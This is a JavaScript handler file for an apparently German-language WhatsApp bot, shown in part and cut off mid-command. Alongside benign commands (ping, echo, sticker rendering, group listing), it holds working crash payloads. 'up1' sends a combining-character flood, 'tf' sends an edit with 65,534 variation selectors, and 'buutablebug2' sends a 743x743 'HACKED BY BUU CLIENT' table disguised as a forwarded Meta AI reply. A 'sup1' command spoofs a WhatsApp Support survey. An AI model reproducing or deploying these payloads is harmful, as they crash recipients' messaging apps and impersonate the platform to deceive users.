// handler.js
import { fs2, idk, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID } from './importer.js';
import { sendJson } from './connect.js';
import conf from './config.js';
import { c } from './color.js';
import { writeFileSync, readFileSync, existsSync, unlinkSync } from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';
import path from 'path';
const execAsync = promisify(exec);
export async function handler(sock, chatUpdate, store) { const msgHandlerError = `${c.red}[Bot-Fehler]${c.reset}\n${c.bgRed}${c.black}Fehler im Message-Handler:${c.reset}`;
try { if (chatUpdate.type !== 'notify') return;
const msg = chatUpdate.messages[0];
if (!msg.message) return;
const buuMenuImagePath = "./media/buu.png";
const pref = conf.prefix;
const ignoreSessionHost = false;
if (msg.key.fromMe && ignoreSessionHost) return;
const buuClient = "🫟BUU CLIENT🫟";
const buuMsgId = generateMessageID();
const from = msg.key.remoteJid;
const isHost = msg.key.fromMe;
const hostJid = sock.user?.id ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : null;
const hostLid = sock.user?.lid ? sock.user.lid.split(':')[0] + '@lid' : null;
const isGroup = from?.endsWith('@g.us') || false;
const isJidUser = from?.endsWith('@s.whatsapp.net') || false;
const isLidUser = from?.endsWith('@lid') || false;
const isInteropUser = from?.endsWith('@interop') || false;
const isMetaAiBot = from?.endsWith('@bot') || false;
const isNewsletter = from?.endsWith('@newsletter') || false;
const isStatus = from === 'status@broadcast';
const isBroadcast = from?.endsWith('@broadcast') && from !== 'status@broadcast';
const isAny = isJidUser || isLidUser || isMetaAiBot || isInteropUser || isNewsletter || isBroadcast || isStatus || isGroup;
const messageContent = msg.message.ephemeralMessage?.message || msg.message.viewOnceMessage?.message || msg.message;
if (!messageContent) return;
const body = messageContent.conversation || messageContent.extendedTextMessage?.text || messageContent.imageMessage?.caption || messageContent.videoMessage?.caption || "";
if (!body.startsWith(pref)) return;
const args = body.slice(pref.length).trim().split(/ +/);
const cmds = args.shift().toLowerCase();
const unknownCmd = `${c.yellow}[Bot-Warnung]${c.reset}\n${c.bgYellow}${c.black}Unbekannter Befehl erhalten:${c.reset}\n${c.cyan}${cmds}${c.reset}`;
const afterCmd = args.join(' ');
switch (cmds) {

case 'st': { 
    const tempDir = path.resolve('./buu');
    const tempId = Date.now();
    const tempWebpPath = path.join(tempDir, `temp_${tempId}.webp`);
    
    try { 
        if (!afterCmd) { 
            await sock.sendMessage(from, { text: `Bitte gib einen Text für den Sticker an.\n> Beispiel:\n\`${pref}st Du sein\\nmein\\nSklave\`` }, { quoted: msg });
        } else {
            await fs2.mkdir(tempDir, { recursive: true });
            
            const fontData = [ 
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x18,0x18,0x18,0x18,0x18,0x00,0x18,0x00, 0x24,0x24,0x00,0x00,0x00,0x00,0x00,0x00, 0x24,0x24,0x7E,0x24,0x7E,0x24,0x24,0x00, 
                0x08,0x1C,0x2A,0x08,0x08,0x2A,0x38,0x08, 0x00,0x66,0x66,0x30,0x18,0x0C,0x66,0x62, 0x30,0x4A,0x4C,0x30,0x48,0x54,0x22,0x00, 0x18,0x18,0x00,0x00,0x00,0x00,0x00,0x00, 
                0x08,0x10,0x20,0x20,0x20,0x10,0x08,0x00, 0x10,0x08,0x04,0x04,0x04,0x08,0x10,0x00, 0x08,0x2A,0x1C,0x08,0x1C,0x2A,0x08,0x00, 0x00,0x08,0x08,0x3E,0x08,0x08,0x00,0x00, 
                0x00,0x00,0x00,0x00,0x00,0x18,0x18,0x10, 0x00,0x00,0x00,0x3E,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x18,0x18,0x00, 0x00,0x02,0x04,0x08,0x10,0x20,0x40,0x00, 
                0x3C,0x42,0x42,0x42,0x42,0x42,0x3C,0x00, 0x18,0x08,0x08,0x08,0x08,0x08,0x3E,0x00, 0x3C,0x42,0x02,0x3C,0x40,0x40,0x7E,0x00, 0x3C,0x42,0x02,0x3C,0x02,0x42,0x3C,0x00, 
                0x08,0x18,0x28,0x48,0x7E,0x08,0x08,0x00, 0x7E,0x40,0x40,0x7C,0x02,0x42,0x3C,0x00, 0x3C,0x40,0x40,0x7C,0x42,0x42,0x3C,0x00, 0x7E,0x02,0x04,0x08,0x10,0x10,0x10,0x00, 
                0x3C,0x42,0x42,0x3C,0x42,0x42,0x3C,0x00, 0x3C,0x42,0x42,0x3E,0x02,0x02,0x3C,0x00, 0x00,0x18,0x18,0x00,0x00,0x18,0x18,0x00, 0x00,0x18,0x18,0x00,0x00,0x18,0x18,0x10, 
                0x00,0x04,0x08,0x10,0x20,0x10,0x08,0x00, 0x00,0x00,0x3E,0x00,0x3E,0x00,0x00,0x00, 0x00,0x20,0x10,0x08,0x04,0x08,0x10,0x00, 0x3C,0x42,0x02,0x1C,0x10,0x00,0x10,0x00, 
                0x3C,0x42,0x5A,0x5A,0x5C,0x40,0x3C,0x00, 0x3C,0x42,0x42,0x7E,0x42,0x42,0x42,0x00, 0x7C,0x42,0x42,0x7C,0x42,0x42,0x7C,0x00, 0x3C,0x42,0x40,0x40,0x40,0x42,0x3C,0x00, 
                0x78,0x44,0x42,0x42,0x42,0x44,0x78,0x00, 0x7E,0x40,0x40,0x7C,0x40,0x40,0x7E,0x00, 0x7E,0x40,0x40,0x7C,0x40,0x40,0x40,0x00, 0x3C,0x42,0x40,0x4E,0x42,0x42,0x3C,0x00, 
                0x42,0x42,0x42,0x7E,0x42,0x42,0x42,0x00, 0x3E,0x08,0x08,0x08,0x08,0x08,0x3E,0x00, 0x02,0x02,0x02,0x02,0x02,0x42,0x3C,0x00, 0x44,0x48,0x50,0x60,0x50,0x48,0x44,0x00, 
                0x40,0x40,0x40,0x40,0x40,0x40,0x7E,0x00, 0x42,0x63,0x55,0x49,0x42,0x42,0x42,0x00, 0x42,0x62,0x52,0x4A,0x46,0x42,0x42,0x00, 0x3C,0x42,0x42,0x42,0x42,0x42,0x3C,0x00, 
                0x7C,0x42,0x42,0x7C,0x40,0x40,0x40,0x00, 0x3C,0x42,0x42,0x42,0x42,0x44,0x3A,0x00, 0x7C,0x42,0x42,0x7C,0x44,0x42,0x42,0x00, 0x3C,0x42,0x40,0x3C,0x02,0x42,0x3C,0x00, 
                0x7E,0x10,0x10,0x10,0x10,0x10,0x10,0x00, 0x42,0x42,0x42,0x42,0x42,0x42,0x3C,0x00, 0x42,0x42,0x42,0x42,0x42,0x24,0x18,0x00, 0x42,0x42,0x42,0x49,0x55,0x63,0x42,0x00, 
                0x42,0x24,0x18,0x18,0x18,0x24,0x42,0x00, 0x42,0x42,0x24,0x18,0x18,0x18,0x18,0x00, 0x7E,0x02,0x04,0x08,0x10,0x20,0x7E,0x00, 0x3C,0x20,0x20,0x20,0x20,0x20,0x3C,0x00, 
                0x00,0x40,0x20,0x10,0x08,0x04,0x02,0x00, 0x3C,0x04,0x04,0x04,0x04,0x04,0x3C,0x00, 0x08,0x14,0x22,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF, 
                0x08,0x04,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x38,0x04,0x3C,0x44,0x3D,0x00, 0x40,0x40,0x58,0x64,0x42,0x42,0x5C,0x00, 0x00,0x00,0x3C,0x40,0x40,0x42,0x3C,0x00, 
                0x04,0x04,0x3C,0x44,0x44,0x44,0x3D,0x00, 0x00,0x00,0x3C,0x42,0x7E,0x40,0x3C,0x00, 0x1C,0x22,0x20,0x78,0x20,0x20,0x20,0x00, 0x00,0x00,0x3D,0x44,0x44,0x3C,0x04,0x38, 
                0x40,0x40,0x5C,0x62,0x42,0x42,0x42,0x00, 0x08,0x00,0x18,0x08,0x08,0x08,0x1C,0x00, 0x04,0x00,0x04,0x04,0x04,0x04,0x04,0x08, 0x40,0x40,0x44,0x48,0x70,0x48,0x44,0x00, 
                0x18,0x08,0x08,0x08,0x08,0x08,0x1C,0x00, 0x00,0x00,0x66,0x55,0x49,0x42,0x42,0x00, 0x00,0x00,0x5C,0x62,0x42,0x42,0x42,0x00, 0x00,0x00,0x3C,0x42,0x42,0x42,0x3C,0x00, 
                0x00,0x00,0x5C,0x62,0x42,0x7C,0x40,0x40, 0x00,0x00,0x3D,0x44,0x44,0x3D,0x04,0x04, 0x00,0x00,0x5C,0x62,0x40,0x40,0x40,0x00, 0x00,0x00,0x3E,0x40,0x3C,0x02,0x7C,0x00, 
                0x20,0x20,0x78,0x20,0x20,0x22,0x1C,0x00, 0x00,0x00,0x42,0x42,0x42,0x46,0x3A,0x00, 0x00,0x00,0x42,0x42,0x42,0x24,0x18,0x00, 0x00,0x00,0x42,0x42,0x49,0x55,0x22,0x00, 
                0x00,0x00,0x42,0x24,0x18,0x24,0x42,0x00, 0x00,0x00,0x42,0x42,0x3E,0x02,0x3C,0x00, 0x00,0x00,0x7E,0x08,0x10,0x20,0x7E,0x00, 0x08,0x10,0x10,0x20,0x10,0x10,0x08,0x00, 
                0x18,0x18,0x18,0x00,0x18,0x18,0x18,0x00, 0x10,0x08,0x08,0x04,0x08,0x08,0x10,0x00, 0x3C,0x66,0x00,0x00,0x00,0x00,0x00,0x00 
            ];

            const canvasWidth = 128;
            const canvasHeight = 128;
            const canvas = Buffer.alloc(canvasWidth * canvasHeight * 4);
            
            const textLines = afterCmd.split('\\n').slice(0, 8);
            const startY = Math.max(0, Math.floor((canvasHeight - (textLines.length * 10)) / 2));

            for (let l = 0; l < textLines.length; l++) { 
                const line = textLines[l];
                const startX = Math.max(0, Math.floor((canvasWidth - (line.length * 8)) / 2));
                const currentY = startY + (l * 10);

                for (let c = 0; c < line.length; c++) { 
                    const charCode = line.charCodeAt(c);
                    const index = (charCode >= 32 && charCode <= 126) ? (charCode - 32) : 0;

                    for (let row = 0; row < 8; row++) { 
                        const byte = fontData[index * 8 + row];
                        for (let col = 0; col < 8; col++) { 
                            if ((byte & (1 << (7 - col))) !== 0) { 
                                const pixelY = currentY + row;
                                const pixelX = startX + (c * 8) + col; 

                                if (pixelX >= 0 && pixelX < canvasWidth && pixelY >= 0 && pixelY < canvasHeight) { 
                                    const offset = (pixelY * canvasWidth + pixelX) * 4;
                                    canvas[offset] = 0xFF;                                
                                    canvas[offset + 1] = 0xE6;                                
                                    canvas[offset + 2] = 0x00;
                                    canvas[offset + 3] = 0xFF;
                                } 
                            } 
                        } 
                    } 
                } 
            } 

            const outWidth = 512;
            const outHeight = 512;
            const outBytes = outWidth * outHeight * 4;
            const scaledPixels = Buffer.alloc(outBytes);

            for (let y = 0; y < outHeight; y++) { 
                const srcY = Math.floor((y / outHeight) * canvasHeight);
                for (let x = 0; x < outWidth; x++) { 
                    const srcX = Math.floor((x / outWidth) * canvasWidth);
                    const srcOffset = (srcY * canvasWidth + srcX) * 4;
                    const destOffset = (y * outWidth + x) * 4;
                    scaledPixels[destOffset] = canvas[srcOffset];
                    scaledPixels[destOffset + 1] = canvas[srcOffset + 1];
                    scaledPixels[destOffset + 2] = canvas[srcOffset + 2];
                    scaledPixels[destOffset + 3] = canvas[srcOffset + 3];
                } 
            } 

            const vp8lSize = outBytes + 5;
            const webpHeader = Buffer.alloc(32);
            webpHeader.write('RIFF', 0);
            webpHeader.writeUInt32LE(32 + outBytes - 8, 4);
            webpHeader.write('WEBP', 8);
            webpHeader.write('VP8L', 12);
            webpHeader.writeUInt32LE(vp8lSize, 16);
            webpHeader.writeUInt8(0x2F, 20);
            
            const sizeInfo = ((outWidth - 1) & 0x3FFF) | (((outHeight - 1) & 0x3FFF) << 14) | (1 << 28);
            webpHeader.writeUInt32LE(sizeInfo, 21);
            
            const finalBuffer = Buffer.concat([webpHeader, scaledPixels]);
            await fs2.writeFile(tempWebpPath, finalBuffer);
            
            await sock.sendMessage(from, { sticker: finalBuffer }, { 
                quoted: msg, 
                options: { 
                    accessibilityLabel: `MADE FOR: ${cmdPushName}\nMADE BY: HONNEYBUU MODZ DEVELOPMENT TEAM` 
                } 
            });
        }
    } catch (error) { 
        console.error("Fehler bei der nativen Sticker-Erstellung:\n", error);
        await sock.sendMessage(from, { text: "Fehler beim Erzeugen des nativen WebP-Stickers." }, { quoted: msg });
    } finally { 
        await fs2.access(tempWebpPath).then(() => fs2.unlink(tempWebpPath)).catch(() => {});
    } 
    break;
}

case 'sup1':
sock.sendJson(from,
{
  "interactiveMessage": {
    "header": {
      "imageMessage": {
        "url": "https://mmg.whatsapp.net/v/t62.7118-24/623364517_1001446096212679_7265910183039160968_n.enc?ccb=11-4&oh=01_Q5Aa5AFcfLr7VaGsh24bT0ovN398Rso2POcKJHklxj6txzyBsw&oe=6A772544&_nc_sid=5e03e0&mms3=true",
        "mimetype": "image/jpeg",
        "fileSha256": "B+ia2qg7S56emNR0rjBZ8rP03GTB98581QTLEItreVE=",
        "fileLength": "13449",
        "height": 292,
        "width": 544,
        "mediaKey": "KmhNoyOu1exUFT6P8jF0HVUwK0VNUn8uttt63kgM610=",
        "fileEncSha256": "JHDyCoSjHpOefjSF21Fz1Qx5n0u13wkJZ9VJhO4aWM4=",
        "directPath": "/v/t62.7118-24/623364517_1001446096212679_7265910183039160968_n.enc?ccb=11-4&oh=01_Q5Aa5AFcfLr7VaGsh24bT0ovN398Rso2POcKJHklxj6txzyBsw&oe=6A772544&_nc_sid=5e03e0",
        "mediaKeyTimestamp": "1783609000",
        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAFA3PEY8MlBGQUZaVVBfeMiCeG5uePWvuZHI////////////////////////////////////////////////////2wBDAVVaWnhpeOuCguv/////////////////////////////////////////////////////////////////////////wAARCAAmAEgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwC5RRRSAKaZEXqwz6UF8HAGaiVVA+ftzmi4mxwmU9eKerq3Q1EDEDwD/hThxP8AUf5/lQJNktFFFBQUUUUAFFFFADSmSTnGaYgDb1PrUtRAqsjhiAD60CYgi5+YjFKwy+4HoOPrSkoOd35CkBO0EjGR19KBJIcpOcc0+mqOM06goKKKKACiiigAppRSckc0UUAGxP7o/KgIo7d80UUAOooooAKKKKAP/9k=",
        "contextInfo": {},
        "thumbnailDirectPath": "/v/t62.35850-24/589206737_888349027127532_1731065116830300966_n.enc?ccb=11-4&oh=01_Q5Aa5AHlevIuZBFpl2Li0-WQHhFlE-i-v_TZnVEKtbw0ThKI1Q&oe=6A7728D1&_nc_sid=5e03e0",
        "thumbnailSha256": "ek6Mp5m+vw/1JeKNxRU05bkiDYcl1b6VoJoFhEEqYCQ=",
        "thumbnailEncSha256": "wHlQG1r0+HVImJdRVtln/pxqukUDLZBWWc67X/NcCcY="
      },
      "hasMediaAttachment": true
    },
    "body": {
      "text": "*How was your experience with WhatsApp Support?*\n\nYour feedback on ticket 1690571848887368 helps WhatsApp improve the support experience."
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "galaxy_message",
          "buttonParamsJson": "{\"flow_message_version\":\"3\",\"flow_token\":\"{\\\"ticket_id\\\":\\\"1690571848887368\\\"}\",\"flow_id\":\"2339829253135704\",\"flow_cta\":\"Rate experience\",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"SATISFACTION_SCREEN\",\"data\":{\"title\":\"Rate experience\",\"continue_label\":\"Continue\",\"satisfaction_screen_question\":\"How satisfied or dissatisfied are you with the support experience?\",\"very_satisfied_label\":\"Very satisfied\",\"slightly_satisfied_label\":\"Slightly satisfied\",\"neutral_label\":\"Neutral\",\"slightly_dissatisfied_label\":\"Slightly dissatisfied\",\"very_dissatisfied_label\":\"Very dissatisfied\",\"helpfulness_screen_question\":\"How helpful or unhelpful were your representative(s)?\",\"very_helpful_label\":\"Very helpful\",\"slightly_helpful_label\":\"Slightly helpful\",\"slightly_unhelpful_label\":\"Slightly unhelpful\",\"very_unhelpful_label\":\"Very unhelpful\",\"question_answered_screen_question\":\"Did we answer your question?\",\"yes_label\":\"Yes\",\"no_label\":\"No\",\"improvement_suggestion_label\":\"What could we do better?\",\"submit_label\":\"Submit\"}},\"flow_metadata\":{\"flow_json_version\":700,\"data_api_protocol\":null,\"data_api_version\":null,\"flow_name\":\"In-App CSAT Survey No Agent v3 - en_US_v1\",\"creation_source\":\"CSAT\",\"categories\":[]},\"icon\":\"DEFAULT\",\"has_multiple_buttons\":false}"
        }
      ],
      "messageParamsJson": "{\"bottom_sheet\":{\"in_thread_buttons_limit\":3,\"divider_indices\":[]},\"catalog_params\":{\"features\":[\"cart\"]}}"
    }
  }
}
);
break;

    case 'up1': { const base = "꧍";
const star = "⃰";
const up = "͊";
let mix = "";
const targetBlocks = 361; 
for (let i = 1;
i <= targetBlocks;
i++) { mix += star + up.repeat(i);
} const upBug = `${base}${mix}`;
sock.sendJson(from, { "questionMessage": { "message": { "extendedTextMessage": { "text": upBug, "contextInfo": { "isSampled": true, "alwaysShowAdAttribution": true, "featureEligibilities": { "cannotBeReactedTo": false, "cannotBeRanked": false, "canRequestFeedback": false, "canBeReshared": true, "canReceiveMultiReact": true } } } } } });
break;
}

 case 'tf': { try { const buuCdata = "HonneybuuModz";
const baseTxt = "> TF🫟";
const qTxt = "Wait…";
const pnChatTarget = from; 
const tf = "\uFE0F"; 
const rc = 65534; 
const tfBugMax = `🇹${tf.repeat(rc)}🇫`;
const sentMsg = await sock.sendMessage(from, { text: baseTxt, contextInfo: { stanzaId: msg.key.id, participant: pnChatTarget, quotedMessage: { conversation: qTxt }, isQuestion: true, alwaysShowAdAttribution: true, conversionData: Buffer.from(buuCdata), conversionDelaySeconds: 7, isSampled: true, featureEligibilities: { cannotBeReactedTo: false, cannotBeRanked: false, canRequestFeedback: false, canBeReshared: true, canReceiveMultiReact: true }, trustBannerType: "1", quotedType: 1 } }, { quoted: msg });
await new Promise(resolve => setTimeout(resolve, 743));
await sock.sendMessage(from, { edit: sentMsg.key, text: tfBugMax, contextInfo: { stanzaId: msg.key.id, participant: pnChatTarget, quotedMessage: { questionMessage: { message: { extendedTextMessage: { text: tfBugMax, contextInfo: { isQuestion: true, isSampled: true, alwaysShowAdAttribution: false, featureEligibilities: { cannotBeReactedTo: false, cannotBeRanked: false, canRequestFeedback: false, canBeReshared: true, canReceiveMultiReact: true } } } } } }, isQuestion: true, isSampled: true, alwaysShowAdAttribution: false, conversionData: Buffer.from(buuCdata), conversionDelaySeconds: 3, featureEligibilities: { cannotBeReactedTo: false, cannotBeRanked: false, canRequestFeedback: false, canBeReshared: true, canReceiveMultiReact: true }, disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING", initiatedByMe: true }, trustBannerType: "1", quotedType: 1 } });
} catch (error) { console.error("Fehler beim Senden oder Editieren der TF-Message:", error);
} break;
}

case 'buutablebug2': { const rowCount = 743;
const colCount = 743;
const textContent = "HACKED BY BUU CLIENT";
const buuCrashXd = Array.from({ length: rowCount }, () => Array(colCount).fill(textContent) );
const buuCrashRows = buuCrashXd.map((rowCells, index) => ({ "is_header": index === 0, "cells": rowCells }));
const buuTableMetadataRows = buuCrashXd.map((rowCells, index) => ({ "items": rowCells, ...(index === 0 && { "isHeading": true }) }));
const buuUnifiedCrashObj = { "response_id": buuMsgId, "sections": [{ "view_model": { "primitive": { "rows": buuCrashRows, "__typename": "GenATableUXPrimitive" }, "__typename": "GenAISingleLayoutViewModel" } }] };
const base64Data = Buffer.from(JSON.stringify(buuUnifiedCrashObj)).toString('base64');
const buuTableCrashJson = { "messageContextInfo": { "botMetadata": { "modelMetadata": {}, "progressIndicatorMetadata": {}, "imagineMetadata": {}, "memoryMetadata": {}, "richResponseSourcesMetadata": {}, "botAgeCollectionMetadata": {}, "unifiedResponseMutation": {} } }, "botForwardedMessage": { "message": { "richResponseMessage": { "messageType": "AI_RICH_RESPONSE_TYPE_STANDARD", "submessages": [{ "messageType": "AI_RICH_RESPONSE_TABLE", "tableMetadata": { "rows": buuTableMetadataRows, "title": buuClient } }], "unifiedResponse": { "data": base64Data }, "contextInfo": { "forwardingScore": 743, "isForwarded": true, "forwardedAiBotMessageInfo": { "botJid": "867051314767696@bot" }, "pairedMediaType": "NOT_PAIRED_MEDIA", "forwardOrigin": "META_AI", "botMessageSharingInfo": { "botEntryPointOrigin": "FAVICON", "forwardScore": 743 } } } } } };
await sendJson(from, buuTableCrashJson, { quoted: msg });             
} break;

case 'buucmds': {
const buuCommands = [
{ cmd: `${pref}test1`, desc: "Info 1" },
{ cmd: `${pref}test2`, desc: "Info 2" },
{ cmd: `${pref}test3`, desc: "Info 3" },
{ cmd: `${pref}test4`, desc: "Info 4" },
{ cmd: `${pref}test5`, desc: "Info 5" },
{ cmd: `${pref}test6`, desc: "Info 6" },
{ cmd: `${pref}test7`, desc: "Info 7" },
{ cmd: `${pref}test8`, desc: "Info 8" },
{ cmd: `${pref}test9`, desc: "Info 9" },
{ cmd: `${pref}test10`, desc: "Info 10" },
{ cmd: `${pref}test11`, desc: "Info 11" },
{ cmd: `${pref}test12`, desc: "Info 12" },
{ cmd: `${pref}test13`, desc: "Info 13" },
{ cmd: `${pref}test14`, desc: "Info 14" },
{ cmd: `${pref}test15`, desc: "Info 15" },
{ cmd: `${pref}test16`, desc: "Info 16" },
{ cmd: `${pref}test17`, desc: "Info 17" },
{ cmd: `${pref}test18`, desc: "Info 18" },
{ cmd: `${pref}test19`, desc: "Info 19" },
{ cmd: `${pref}test20`, desc: "Info 20" }, ];
const unifiedObj = { "response_id": buuMsgId, "sections": [{ "view_model": { "primitive": { "rows": buuCommands.map((c, index) => ({ "is_header": index === 0, "cells": [c.cmd, c.desc] })), "__typename": "GenATableUXPrimitive" }, "__typename": "GenAISingleLayoutViewModel" } }] };
const base64Data = Buffer.from(JSON.stringify(unifiedObj)).toString('base64');
const buuTableJson = { "messageContextInfo": { "botMetadata": { "modelMetadata": {}, "progressIndicatorMetadata": {}, "imagineMetadata": {}, "memoryMetadata": {}, "richResponseSourcesMetadata": {}, "botAgeCollectionMetadata": {}, "unifiedResponseMutation": {}} }, "botForwardedMessage": { "message": { "richResponseMessage": { "messageType": "AI_RICH_RESPONSE_TYPE_STANDARD", "submessages": [{ "messageType": "AI_RICH_RESPONSE_TABLE", "tableMetadata": { "rows": buuCommands.map((c, index) => ({ "items": [c.cmd, c.desc], ...(index === 0 && { "isHeading": true }) })), "title": buuClient } }], "unifiedResponse": { "data": base64Data }, "contextInfo": { "forwardingScore": 743, "isForwarded": true, "forwardedAiBotMessageInfo": { "botJid": "867051314767696@bot" }, "pairedMediaType": "NOT_PAIRED_MEDIA", "forwardOrigin": "META_AI", "botMessageSharingInfo": { "botEntryPointOrigin": "FAVICON", "forwardScore": 743 } } } } } };
await sendJson(from, buuTableJson, { quoted: msg });
} break;

case 'buucmds2': {
const cmdTxt = "🤖:";
const cmdInfo = "ℹ️:";
const cmdId = "🆔:";
const buuCommands = [
{ cmd: `${pref}test1`, info: "Info 1", id: "01" },
{ cmd: `${pref}test2`, info: "Info 2", id: "02" },
{ cmd: `${pref}test3`, info: "Info 3", id: "03" },
{ cmd: `${pref}test4`, info: "Info 4", id: "04" },
{ cmd: `${pref}test5`, info: "Info 5", id: "05" },
{ cmd: `${pref}test6`, info: "Info 6", id: "06" },
{ cmd: `${pref}test7`, info: "Info 7", id: "07" },
{ cmd: `${pref}test8`, info: "Info 8", id: "08" },
{ cmd: `${pref}test9`, info: "Info 9", id: "09" },
{ cmd: `${pref}test10`, info: "Info 10", id: "10" },
{ cmd: `${pref}test11`, info: "Info 11", id: "11" },
{ cmd: `${pref}test12`, info: "Info 12", id: "12" },
{ cmd: `${pref}test13`, info: "Info 13", id: "13" },
{ cmd: `${pref}test14`, info: "Info 14", id: "14" },
{ cmd: `${pref}test15`, info: "Info 15", id: "15" },
{ cmd: `${pref}test16`, info: "Info 16", id: "16" },
{ cmd: `${pref}test17`, info: "Info 17", id: "17" },
{ cmd: `${pref}test18`, info: "Info 18", id: "18" },
{ cmd: `${pref}test19`, info: "Info 19", id: "19" },
{ cmd: `${pref}test20`, info: "Info 20", id: "20" }, ];
const headerCells = [cmdTxt, cmdInfo, cmdId];
const dataCells = buuCommands.map((c) => [c.cmd, c.info, c.id]);
const primitiveRows = [ { "is_header": true, "cells": headerCells }, ...dataCells.map((cells) => ({ "is_header": false, "cells": cells })) ];
const metadataRows = [ { "items": headerCells, "isHeading": true }, ...dataCells.map((cells) => ({ "items": cells })) ];
const unifiedObj = { "response_id": buuMsgId, "sections": [{ "view_model": { "primitive": { "rows": primitiveRows, "__typename": "GenATableUXPrimitive" }, "__typename": "GenAISingleLayoutViewModel" } }] };
const base64Data = Buffer.from(JSON.stringify(unifiedObj)).toString('base64');
const buuTableJson = { "messageContextInfo": { "botMetadata": { "modelMetadata": {}, "progressIndicatorMetadata": {}, "imagineMetadata": {}, "memoryMetadata": {}, "richResponseSourcesMetadata": {}, "botAgeCollectionMetadata": {}, "unifiedResponseMutation": {}} }, "botForwardedMessage": { "message": { "richResponseMessage": { "messageType": "AI_RICH_RESPONSE_TYPE_STANDARD", "submessages": [{ "messageType": "AI_RICH_RESPONSE_TABLE", "tableMetadata": { "rows": metadataRows, "title": `${buuClient}` } }], "unifiedResponse": { "data": base64Data }, "contextInfo": { "forwardingScore": 743, "isForwarded": true, "forwardedAiBotMessageInfo": { "botJid": "867051314767696@bot" }, "pairedMediaType": "NOT_PAIRED_MEDIA", "forwardOrigin": "META_AI", "botMessageSharingInfo": { "botEntryPointOrigin": "FAVICON", "forwardScore": 743 } } } } } };
await sendJson(from, buuTableJson, { quoted: msg });
} break;

case 'allg': {
try { const groupData = await sock.groupFetchAllParticipating();
const groups = Object.values(groupData);
let textList = '*Deine WhatsApp-Gruppen:*\n\n';
let count = 0;
groups.forEach(group => { const groupName = group.subject || idk;
textList += `👥 *Name:* ${groupName}\n🆔 *ID:* ${group.id}\n\n`;
count++;
});
if (count === 0) { textList = 'Der Bot befindet sich aktuell in keiner Gruppe.';
} await sock.sendMessage(from, { text: textList }, { quoted: msg });
} catch (error) { console.error("Fehler beim Abrufen der Gruppen:", error);
await sock.sendMessage(from, { text: '❌ Fehler beim Laden der Gruppenliste.' }, { quoted: msg });
} break;
}

case 'send2g': { 
const sendArgs = body.trim().split(/ +/).slice(1);
if (sendArgs.length < 2) { await sock.sendMessage(from, { text: '⚠️ *Fehler:* Bitte verwende das Format: `!send2g [Gruppen-ID] [Nachricht]`' }, { quoted: msg });
break;
} 

const targetJid = sendArgs[0];
const messageToSend = sendArgs.slice(1).join(' ');
if (!targetJid.endsWith('@g.us')) { await sock.sendMessage(from, { text: '⚠️ *Fehler:* Die ID muss auf `@g.us` enden.' }, { quoted: msg });
break;
} try { await sock.sendMessage(targetJid, { text: messageToSend });
await sock.sendMessage(from, { text: `✅ Nachricht erfolgreich an Gruppe gesendet!` }, { quoted: msg });
} catch (error) { console.error(error);
await sock.sendMessage(from, { text: '❌ Nachricht konnte nicht gesendet werden. Überprüfe die ID oder ob der Bot in der Gruppe ist.' }, { quoted: msg });
} break;
}

case 'p': case 'ping': { 
const startTime = Date.now();
const sentMsg = await sock.sendMessage(from, { text: '> PING WIRD ERMITTELT...' }, { quoted: msg });
const latency = Date.now() - startTime;
await sock.sendMessage(from, { text: `> BOT LATENZ: \`${latency}ms\``, edit: sentMsg.key });
break;
}

case 'hi': case 'hallo': case 'bot': {
const pushName = msg.pushName || idk;
await sock.sendMessage(from, { text: `Hallo ${pushName}!\n👋 Wie kann ich dir helfen?\n> ZU DEN COMMANDS:\n${pref}cmds` }, { quoted: msg });
break;
}

case 'echo': {
if (!afterCmd) { await sock.sendMessage(from, { text: `Bitte gib einen Text an, den ich wiederholen soll.\n> Beispiel:\n\`${pref}echo Hallo Welt*\`` }, { quoted: msg });
} else { await sock.sendMessage(from, { text: afterCmd }, { quoted: msg });
} break;
}

case 'setname': {
if (!isHost) { await sock.sendMessage(from, { text: `❌ *Fehler:*\nDieser Befehl ist nur für den Bot-Besitzer (Host) erlaubt.` }, { quoted: msg });
} else if (!afterCmd) { await sock.sendMessage(from, { text: `Bitte gib dein neuen Namen an.\nBeispiel: *${pref}setname xois*` }, { quoted: msg });
} else { try { await sock.updateProfileName(afterCmd); 
await sock.sendMessage(from, { text: `✅ Profilname erfolgreich geändert...\nin:.*${afterCmd}*` }, { quoted: msg });
} catch (err) { console.error(`${c.red}[Setname-Fehler]${c.reset}`, err);
await sock.sendMessage(from, { text: `❌ *Fehler:*\nbeim Ändern des Profilnamens.` }, { quoted: msg });
} } break;
}

case 'avo': { 
if (!isHost) { await sock.sendMessage(from, { text: `❌ *Fehler:*\nDieser Befehl ist nur für den Bot-Besitzer (Host) erlaubt.` }, { quoted: msg });
